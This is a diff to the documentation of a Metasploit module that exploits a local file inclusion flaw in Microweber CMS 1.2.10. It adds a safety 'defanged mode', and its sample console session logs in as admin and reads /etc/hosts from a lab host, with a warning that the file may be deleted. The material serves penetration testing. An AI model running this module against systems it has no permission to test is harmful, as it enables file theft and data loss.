@@ -13,8 +13,12 @@ If you want, you can follow the steps in the official vulnerability report to re
 - [ ] Set `PASSWORD`
 - [ ] Set `LOCAL_FILE_PATH`
 - [ ] Run `exploit`
+- [ ] Verify that you see `Checking if it's Microweber CMS.`
+- [ ] Verify that you see `Microweber CMS has been detected.`
 - [ ] Verify that you see `Checking Microweber's version.`
-- [ ] Verify that you see `Microweber Version: 1.2.10`
+- [ ] Verify that you see `Microweber version 1.2.10`
+- [ ] Verify that you see `The target appears to be vulnerable.`
+- [ ] Verify that you see `Trying to log in.`
 - [ ] Verify that you see `You are logged in`
 - [ ] Verify that you see `Uploading LOCAL_FILE_PATH to the backup folder.`
 - [ ] Verify that you see `FILE was moved!`
@@ -28,14 +32,15 @@ Module options (auxiliary/gather/microweber_lfi):
 
    Name             Current Setting  Required  Description
    ----             ---------------  --------  -----------
-   LOCAL_FILE_PATH  /etc/hosts       yes       The path of the local file.
-   PASSWORD         admin            yes       The admin's password for Microweber
+   DEFANGED_MODE    true             yes       Run in defanged mode
+   LOCAL_FILE_PATH                   yes       The path of the local file.
+   PASSWORD                          yes       The admin's password for Microweber
    Proxies                           no        A proxy chain of format type:host:port[,type:host:port][...]
-   RHOSTS           192.168.188.132  yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
+   RHOSTS                            yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
    RPORT            80               yes       The target port (TCP)
    SSL              false            no        Negotiate SSL/TLS for outgoing connections
    TARGETURI        /                yes       The base path for Microweber
-   USERNAME         admin            yes       The admin's username for Microweber
+   USERNAME                          yes       The admin's username for Microweber
    VHOST                             no        HTTP server virtual host
 ```
 
@@ -54,16 +59,35 @@ msf6 auxiliary(gather/microweber_lfi) > set rhosts 192.168.188.132
 rhosts => 192.168.188.132
 msf6 auxiliary(gather/microweber_lfi) > check
 
-[!] Triggering this vulnerability may delete the local file that is wanted to be read.
+[*] Checking if it's Microweber CMS.
+[+] Microweber CMS has been detected.
 [*] Checking Microweber's version.
-[+] Microweber Version: 1.2.10
-[+] 192.168.188.132:80 - The target is vulnerable.
+[+] Microweber version 1.2.10
+[*] 192.168.188.132:80 - The target appears to be vulnerable.
 msf6 auxiliary(gather/microweber_lfi) > exploit
 [*] Running module against 192.168.188.132
 
-[!] Triggering this vulnerability may delete the local file that is wanted to be read.
+[*] Running automatic check ("set AutoCheck false" to disable)
+[*] Checking if it's Microweber CMS.
+[+] Microweber CMS has been detected.
 [*] Checking Microweber's version.
-[+] Microweber Version: 1.2.10
+[+] Microweber version 1.2.10
+[+] The target appears to be vulnerable.
+[-] Auxiliary aborted due to failure: bad-config: Triggering this vulnerability may delete the local file if the web service user has the permission.
+If you want to continue, disable the DEFANGED_MODE.
+=> set DEFANGED_MODE false
+msf6 auxiliary(gather/microweber_lfi) > set defanged_mode false
+defanged_mode => false
+msf6 auxiliary(gather/microweber_lfi) > exploit
+[*] Running module against 192.168.188.132
+
+[*] Running automatic check ("set AutoCheck false" to disable)
+[*] Checking if it's Microweber CMS.
+[+] Microweber CMS has been detected.
+[*] Checking Microweber's version.
+[+] Microweber version 1.2.10
+[+] The target appears to be vulnerable.
+[*] Trying to log in.
 [+] You are logged in
 [*] Uploading /etc/hosts to the backup folder.
 [+] hosts was moved!
